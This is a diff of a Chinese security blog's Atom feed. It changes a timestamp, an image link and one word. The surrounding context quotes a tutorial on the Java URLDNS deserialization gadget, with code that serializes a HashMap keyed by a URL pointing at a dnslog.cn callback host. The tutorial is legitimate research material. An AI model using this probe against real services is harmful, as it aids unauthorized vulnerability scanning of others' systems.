@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2021-01-07T14:25:16.339Z</updated>
+    <updated>2021-01-07T14:36:52.045Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -157,7 +157,7 @@ public class  UrldnsDemo {
 <p>而java.util.HashMap这个类重写了readObject方法(跟进头部代码import java.util.HashMap的HashMap即可获得源代码)，且设置为此readObject()方法在被反序列化时执行，最终在此方法的代码最下面执行了hash方法传入的参数是从反序列化字节码中得到的key</p>
 <figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1609139845213.png" alt="" loading="lazy"></figure>
 <p><img src="https://www.svenbeast.com/post-images/1609139850530.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1609139857015.png" alt="" loading="lazy"></p>
+<img src="https://www.svenbeast.com/post-images/1610029748541.png" alt="" loading="lazy"></p>
 <p>所以尝试写一下payload，看看能否反序列化时发出dns请求</p>
 <pre><code class="language-java">Map hashMap = new HashMap();  //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用
 URL url = new URL(&quot;http://dskg3c.dnslog.cn&quot;);  //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的
@@ -169,7 +169,7 @@ oos.writeObject(hashMap);
 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
 ois.readObject();
 </code></pre>
-<p>发现在反序列化时无法发出dns请求，后续在HashMap.java的1413行就是hash方法那里打断点跟进后面的代码才知道，是因为下图显示，满足hashCode!=-1条件，没有执行902行真正的hashCode()方法</p>
+<p>发现在反序列化时无法发出dns请求，后续在HashMap.java的1413行就是hash方法那里打断点跟进后面的代码才知道，就是因为下图显示，满足hashCode!=-1条件，没有执行902行真正的hashCode()方法</p>
 <figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1609140053169.png" alt="" loading="lazy"></figure>
 <p>所以要更改hashCode变量的值就用到了java的反射，代码修改为</p>
 <pre><code class="language-java">package com.company;
